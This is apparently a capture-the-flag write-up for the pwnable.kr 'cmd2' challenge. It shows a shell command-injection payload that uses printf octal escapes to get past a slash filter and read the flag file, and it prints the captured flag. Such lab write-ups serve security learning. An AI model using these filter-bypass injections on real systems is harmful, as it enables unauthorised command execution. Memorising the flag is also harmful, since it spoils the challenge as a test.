# Toddler's Bottle - cmd2

> Daddy bought me a system command shell.
>
> but he put some filters to prevent me from playing with it without his permission...
> but I wanna play anytime I want!

The source code in `cmd2.c` is very similar to the cmd1 challenge.
For the `cmd1` challenge, I did the following:

```
$ ./cmd1 '$(printf "/bin/cat %slag" "f")'
```

Unfortunately, right now, forward slashes (`/`) are not allowed anymore. By escaping those characters, I still can work around that:

```
cmd2@pwnable:~$ ./cmd2 '$(printf "\057bin\057cat %slag" "f")'
$(printf "\057bin\057cat %slag" "f")
FuN_w1th_5h3ll_v4riabl3s_haha
```
